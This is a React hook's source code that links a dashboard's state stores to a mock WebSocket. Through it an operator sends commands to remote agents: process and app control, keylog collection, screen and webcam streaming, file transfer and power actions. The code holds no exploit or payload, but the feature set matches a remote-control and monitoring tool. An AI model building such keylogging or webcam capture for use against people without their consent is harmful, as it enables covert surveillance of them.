// UseAgentSocket.js — sole glue layer between the socket service and Zustand stores.
//
// Components must NEVER import MockSocket or Socket directly; they use this hook.
// Swapping MockSocket for the real Socket only requires changing the one import below.
//
// SINGLETON PATTERN — ref-counted so multiple components can call useAgentSocket()
// without opening extra WebSocket connections.
// The socket is created when the first caller mounts (refcount 0 → 1) and closed
// when the last caller unmounts (refcount 1 → 0, i.e. the whole app tears down).
//
// TARGETING — the hook returns three send helpers:
//   sendCommand(json)     — raw: sends the JSON string as-is (for list_agents, power, etc.)
//   sendToFocused(json)   — auto-injects [focused_agent_id] into target_agents
//                           before sending. Used by module tabs in FocusView.
//   sendToSelected(json)  — auto-injects selected_agent_ids into target_agents
//                           before sending. Used for batch commands.
//
// BINARY FRAME DISPATCH — screen/webcam JPEG frames arrive as two consecutive
// messages: a JSON frame_meta followed by a raw ArrayBuffer. We hold the most
// recent frame_meta in _pending_meta. When a binary message arrives we pair it
// with _pending_meta and push the complete frame into ModuleStore.
//
// RX DISPATCH — every incoming message is routed by its "type" field to the
// correct Zustand store action. See the dispatchMessage() function at the bottom
// for the full routing table.

import { useEffect } from 'react'

import MockSocket                        from '../services/MockSocket'   // TODO: swap to Socket.js when backend is ready
import { buildListAgents, MSG_TYPE }     from '../services/Protocol'
import useConnectionStore                from '../store/ConnectionStore'
import useAgentStore                     from '../store/AgentStore'
import useModuleStore                    from '../store/ModuleStore'
import useUiStore                        from '../store/UiStore'

// ── Singleton state (module-level, shared across all hook invocations) ────────

let _socket       = null   // the one shared socket instance
let _refcount     = 0      // how many mounted components hold a reference
let _pending_meta = null   // last frame_meta awaiting its binary companion

// ─────────────────────────────────────────────────────────────────────────────

export default function useAgentSocket()
{
    // Read store actions directly via getState() instead of hook selectors.
    // Actions are stable function refs that never change, so we do not need
    // to subscribe to the stores here — we only call the actions inside
    // socket callbacks which run outside the React render cycle anyway.
    // This also keeps the hook count constant (only 1 useEffect below),
    // which avoids HMR hook-order mismatches during development.
    const setStatus     = useConnectionStore.getState().setStatus
    const setAgents     = useAgentStore.getState().setAgents
    const setModuleData = useModuleStore.getState().setModuleData
    const appendKeylog  = useModuleStore.getState().appendKeylog
    const addToast      = useUiStore.getState().addToast

    // ── Lifecycle: create / destroy the shared socket ─────────────────────
    useEffect(function ()
    {
        _refcount++

        // First caller creates the socket; later callers just bump the count.
        if (_socket === null)
        {
            const socket = new MockSocket()
            _socket      = socket

            socket.onOpen(function ()
            {
                setStatus('open')
                socket.send(buildListAgents())   // request agent list right away
            })

            socket.onMessage(function (msg)
            {
                dispatchMessage(msg, { setStatus, setAgents, setModuleData, appendKeylog, addToast })
            })

            // Binary callback — pair incoming ArrayBuffer with the pending frame_meta.
            // This runs immediately after the frame_meta JSON callback above,
            // so _pending_meta is guaranteed to be the matching header.
            socket.onBinary(function (buffer)
            {
                if (!_pending_meta)
                {
                    console.warn('[useAgentSocket] binary arrived without pending frame_meta — dropped')
                    return
                }

                const meta      = _pending_meta
                _pending_meta   = null            // consume the pending meta

                // Route to the correct module slot (screen or webcam)
                const module_key = meta.module    // "screen" or "webcam"
                setModuleData(meta.agent_id, module_key, { frame: buffer, meta })
            })

            socket.onClose(function ()  { setStatus('closed') })
            socket.onError(function ()  { setStatus('closed') })

            socket.connect()
        }

        return function ()
        {
            _refcount--
            if (_refcount === 0 && _socket !== null)
            {
                _pending_meta = null
                _socket.close()
                _socket = null
            }
        }
    }, [])   // run once per component mount

    // ── TX helpers ────────────────────────────────────────────────────────

    // Send a pre-built JSON string exactly as-is.
    // Use this for messages that already have the correct target_agents
    // or for top-level types that do not need targeting (list_agents, power).
    function sendCommand(json_string)
    {
        if (_socket)
        {
            _socket.send(json_string)
        }
        else
        {
            console.warn('[useAgentSocket] sendCommand called before socket is ready')
        }
    }

    // Parse the JSON, overwrite target_agents with [focused_agent_id], re-send.
    // Designed for module tabs inside FocusView — they can call
    //   sendToFocused(buildAppList())
    // instead of manually threading agent.id into every builder call.
    // If no agent is focused the message is silently dropped (nothing to send to).
    function sendToFocused(json_string)
    {
        const focused_id = useAgentStore.getState().focused_agent_id
        if (!focused_id)
        {
            console.warn('[useAgentSocket] sendToFocused: no agent focused — message dropped')
            return
        }
        sendWithTargets(json_string, [focused_id])
    }

    // Parse the JSON, overwrite target_agents with selected_agent_ids, re-send.
    // Designed for batch / multi-agent commands.
    // If no agents are selected the message is silently dropped.
    function sendToSelected(json_string)
    {
        const ids = useAgentStore.getState().selected_agent_ids
        if (!ids || ids.length === 0)
        {
            console.warn('[useAgentSocket] sendToSelected: no agents selected — message dropped')
            return
        }
        sendWithTargets(json_string, ids)
    }

    return { sendCommand, sendToFocused, sendToSelected }
}

// ── Private: inject target_agents and send ───────────────────────────────────

// Parse the JSON string, set target_agents to the given array, re-stringify, send.
// Shared logic behind sendToFocused / sendToSelected.
function sendWithTargets(json_string, target_ids)
{
    if (!_socket)
    {
        console.warn('[useAgentSocket] sendWithTargets called before socket is ready')
        return
    }

    try
    {
        const msg           = JSON.parse(json_string)
        msg.target_agents   = target_ids
        _socket.send(JSON.stringify(msg))
    }
    catch (err)
    {
        console.error('[useAgentSocket] failed to inject target_agents:', err)
    }
}

// ── RX dispatch: route incoming messages to the correct store action ─────────
//
// Routing table (message.type → store action):
//
//   agents_list        → AgentStore.setAgents(agents)
//   agent_status       → (TODO) update single agent online flag
//   app_list_result    → ModuleStore.setModuleData(id, 'app', apps)
//   app_action_result  → console.info (tab re-fetches on next poll)
//   proc_list_result   → ModuleStore.setModuleData(id, 'process', procs)
//   proc_kill_result   → console.info (tab re-fetches on next poll)
//   keylog             → ModuleStore.appendKeylog(id, events)
//   keylog_started/stopped/denied → (TODO) update active-state flag
//   stream_started/stopped        → (TODO) update active-state flag
//   webcam_started/stopped/denied → (TODO) update active-state flag
//   frame_meta         → stored in _pending_meta; paired with next binary
//   fs_list_result     → ModuleStore.setModuleData(id, 'file', {entries, path})
//   fs_get_result      → (TODO) forward to FileModule download handler
//   fs_put_result / fs_put_complete → (TODO) forward upload progress
//   fs_error           → (TODO) surface file error in FileModule
//   power_result       → (TODO) surface in PowerModule

function dispatchMessage(msg, { setStatus, setAgents, setModuleData, appendKeylog, addToast })
{
    switch (msg.type)
    {
        // ── Connection ────────────────────────────────────────────────────
        case MSG_TYPE.AGENTS_LIST:
            setAgents(msg.agents)
            break

        case MSG_TYPE.AGENT_STATUS:
            // TODO: update a single agent's online flag
            break

        // ── Application ───────────────────────────────────────────────────
        case MSG_TYPE.APP_LIST_RESULT:
            setModuleData(msg.agent_id, 'app', msg.apps)
            break

        case MSG_TYPE.APP_ACTION_RESULT:
            addToast(
                msg.success
                    ? `${msg.name}: ${msg.action === 'app_start' ? 'started' : 'stopped'}`
                    : `${msg.name}: action failed — ${msg.message}`,
                msg.success ? 'success' : 'error'
            )
            break

        // ── Process ───────────────────────────────────────────────────────
        case MSG_TYPE.PROC_LIST_RESULT:
            setModuleData(msg.agent_id, 'process', msg.processes)
            break

        case MSG_TYPE.PROC_KILL_RESULT:
            addToast(
                msg.success
                    ? `${msg.name ?? 'PID ' + msg.pid}: terminated`
                    : `PID ${msg.pid}: kill failed — ${msg.message}`,
                msg.success ? 'success' : 'error'
            )
            break

        // ── Keylog ────────────────────────────────────────────────────────
        case MSG_TYPE.KEYLOG:
            appendKeylog(msg.agent_id, msg.events)
            break

        case MSG_TYPE.KEYLOG_STARTED:
        case MSG_TYPE.KEYLOG_STOPPED:
        case MSG_TYPE.KEYLOG_DENIED:
            // TODO: update keylog active-state flag in ModuleStore
            break

        // ── Screen / Webcam binary frames ─────────────────────────────────
        case MSG_TYPE.STREAM_STARTED:
        case MSG_TYPE.STREAM_STOPPED:
            // TODO: update screen streaming flag in ModuleStore
            break

        case MSG_TYPE.FRAME_META:
            // Hold this meta until the next binary message arrives.
            // The onBinary callback in the lifecycle block above will
            // consume it and push the completed frame into ModuleStore.
            _pending_meta = msg
            break

        // ── Webcam ────────────────────────────────────────────────────────
        case MSG_TYPE.WEBCAM_STARTED:
        case MSG_TYPE.WEBCAM_STOPPED:
        case MSG_TYPE.WEBCAM_DENIED:
            // TODO: update webcam active-state flag in ModuleStore
            break

        // ── File ──────────────────────────────────────────────────────────
        case MSG_TYPE.FS_LIST_RESULT:
            setModuleData(msg.agent_id, 'file', { entries: msg.entries, path: msg.path })
            break

        case MSG_TYPE.FS_GET_RESULT:
            // TODO: forward to FileModule download handler
            break

        case MSG_TYPE.FS_PUT_RESULT:
        case MSG_TYPE.FS_PUT_COMPLETE:
            // TODO: forward upload progress to FileModule
            break

        case MSG_TYPE.FS_ERROR:
            // TODO: surface file error in FileModule
            break

        // ── Power ─────────────────────────────────────────────────────────
        case MSG_TYPE.POWER_RESULT:
            // TODO: surface power action result in PowerModule
            break

        // ── Catch-all ─────────────────────────────────────────────────────
        default:
            console.warn('[useAgentSocket] unhandled message type:', msg.type)
    }
}
